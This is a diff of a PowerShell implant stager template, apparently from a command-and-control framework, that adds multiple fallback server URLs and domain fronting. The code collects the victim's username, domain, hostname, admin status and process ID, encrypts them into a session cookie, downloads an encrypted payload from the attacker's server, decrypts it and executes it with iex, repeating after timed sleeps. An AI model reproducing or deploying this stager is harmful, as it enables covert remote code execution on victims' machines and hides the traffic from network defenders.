@@ -1,6 +1,10 @@
 #REPLACEINSECURE#
-$sc="#REPLACEHOSTPORT#"
-$s="#REPLACEIMPTYPE#"
+$df=@(#REPLACEDOMAINFRONT#)
+$h=""
+$sc=""
+$urls=@(#REPLACEIMPTYPE#)
+$curl="#REPLACECONNECTURL#"
+$s=$urls[0]
 function CAM ($key,$IV){
 try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"
 } catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
@@ -48,7 +52,6 @@ $password = "#REPLACEPROXYPASS#"
 $proxyurl = "#REPLACEPROXYURL#"
 $wc = New-Object System.Net.WebClient;
 #REPLACEPROXYCOMMAND#
-$h="#REPLACEDOMAINFRONT#"
 if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add("Host",$h)}
 elseif($h){$script:s="https://$($h)#REPLACECONNECT#";$script:sc="https://$($h)"}
 $wc.Headers.Add("User-Agent","#REPLACEUSERAGENT#")
@@ -64,8 +67,11 @@ $wc.Proxy = $wp; } else {
 $wc.UseDefaultCredentials = $true;
 $wc.Proxy.Credentials = $wc.Credentials;
 } if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
-$wc }
-function primer {
+$wc}
+function primern($url,$uri,$df) {
+$script:s=$url+$uri
+$script:sc=$url
+$script:h=$df
 $cu = [System.Security.Principal.WindowsIdentity]::GetCurrent()
 $wp = New-Object System.Security.Principal.WindowsPrincipal($cu)
 $ag = [System.Security.Principal.WindowsBuiltInRole]::Administrator
@@ -73,12 +79,16 @@ if ($wp.IsInRole($ag)){$el="*"}else{$el=""}
 try{$u=($cu).name+$el} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
 $o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;#REPLACEURLID#"
 try {$pp=enc -key #REPLACEKEY# -un $o} catch {$pp="ERROR"}
-$primer = (Get-Webclient -Cookie $pp).downloadstring($s)
-$p = dec -key #REPLACEKEY# -enc $primer
+$primern = (Get-Webclient -Cookie $pp).downloadstring($script:s)
+$p = dec -key #REPLACEKEY# -enc $primern
 if ($p -like "*key*") {$p| iex}
 }
-try {primer} catch {}
+function primers {
+foreach($url in $urls){
+$index = [array]::IndexOf($urls, $url)
+try {primern $url $curl $df[$index]} catch {write-output $error[0]}}}
+primers
 Start-Sleep 300
-try {primer} catch {}
+primers
 Start-Sleep 600
-try {primer} catch {}
+primers
